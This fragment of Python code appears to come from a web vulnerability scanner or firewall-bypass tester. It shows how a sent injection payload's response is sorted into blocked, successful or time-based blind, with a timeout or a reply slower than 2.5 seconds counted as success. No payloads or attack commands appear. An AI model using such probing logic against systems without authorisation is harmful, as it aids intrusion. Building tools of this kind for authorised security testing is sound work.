            cookies=cookies,
            extra_params=extra_params,
            headers=headers,
        )
        elapsed = time.monotonic() - start

        if resp is None:
            # If this was a time-based blind payload the timeout itself is signal.
            is_time_based = payload.technique == Technique.TIME_BASED_BLIND
            return PayloadResult(
                payload=payload.raw,
                technique_used=payload.technique,
                response_code=0,
                blocked=not is_time_based,
                success=is_time_based,
                evidence="Request timed out (possible time-based blind)" if is_time_based else "Request failed",
                response_time=elapsed,
                response_size=0,
            )

        blocked = _looks_blocked(resp, baseline_code, baseline_size)
        success, evidence = _looks_successful(resp, payload.vuln_type, payload.raw)

        # Time-based blind detection: if SLEEP-style payload and response was
        # slow, treat as success.
        if (
            payload.technique == Technique.TIME_BASED_BLIND
            and not success
            and elapsed >= 2.5
        ):
            success = True
            evidence = f"Time-based blind: response took {elapsed:.1f}s"
            blocked = False

        return PayloadResult(
            payload=payload.raw,
            technique_used=payload.technique,
            response_code=resp.status_code,
            blocked=blocked,
            success=success,
            evidence=evidence,
            response_time=elapsed,
            response_size=len(resp.text),
        )
